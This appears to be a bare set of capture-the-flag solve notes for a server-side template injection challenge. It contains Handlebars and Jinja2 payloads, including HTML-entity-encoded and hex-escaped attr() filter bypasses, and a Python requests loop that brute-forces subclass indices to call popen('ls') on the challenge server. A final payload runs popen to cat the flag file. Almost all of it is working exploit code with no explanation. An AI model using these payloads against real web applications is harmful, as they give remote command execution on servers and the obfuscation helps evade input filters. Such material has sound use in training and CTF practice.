'''
{{#each this}} {{@this}} {{/each}}
https://double-ssti.chal.h4ck3r.quest/2nd_stage_77777me0w_me0w_s3cr3t77777


{{&#x28;&#x29;&#x2E;&#x5F;&#x5F;&#x63;&#x6C;&#x61;&#x73;&#x73;&#x5F;&#x5F;&#x2E;&#x5F;&#x5F;&#x62;&#x61;&#x73;&#x65;&#x5F;&#x5F;&#x2E;&#x5F;&#x5F;&#x73;&#x75;&#x62;&#x63;&#x6C;&#x61;&#x73;&#x73;&#x65;&#x73;&#x5F;&#x5F;&#x28;&#x29;&#x5B;&#x22;&#x2B;&#x73;&#x74;&#x72;&#x28;&#xA;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x69;&#x29;&#x2B;&#x22;&#x5D;&#x2E;&#x5F;&#x5F;&#x69;&#x6E;&#x69;&#x74;&#x5F;&#x5F;}}
'''


import requests




for i in range(0, 133):
    s = "{{().__class__.__base__.__subclasses__()["+str(
        i)+"].__init__.__globals__['popen']('ls').read() }}"


    d = {'name': s}
    r = requests.post("https://double-ssti.chal.h4ck3r.quest/2nd_stage_77777me0w_me0w_s3cr3t77777/", data=d)
    print(str(i)+":"+str(r.content))



{{ ''.__class__.__mro__[2].__subclasses__() }}

{{ ''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()}}


{{
    ().
    __class__.
    __base__.
    __subclasses__()[133].
    __init__.
    __globals__['popen']('ls').
    read() 
    }}

{{
''|
attr('\x5f\x5fclass\x5f\x5f')|
attr('\x5f\x5fbase\x5f\x5f')|
attr('\x5f\x5fsubclasses\x5f\x5f')()|
attr('\x5f\x5fgetitem\x5f\x5f')(132)|
attr('\x5f\x5finit\x5f\x5f')|
attr('\x5f\x5fglobals\x5f\x5f')|
attr('\x5f\x5fgetitem\x5f\x5f')('popen')('cat /y000_i_am_za_fl4g')|
attr('read')() 
}}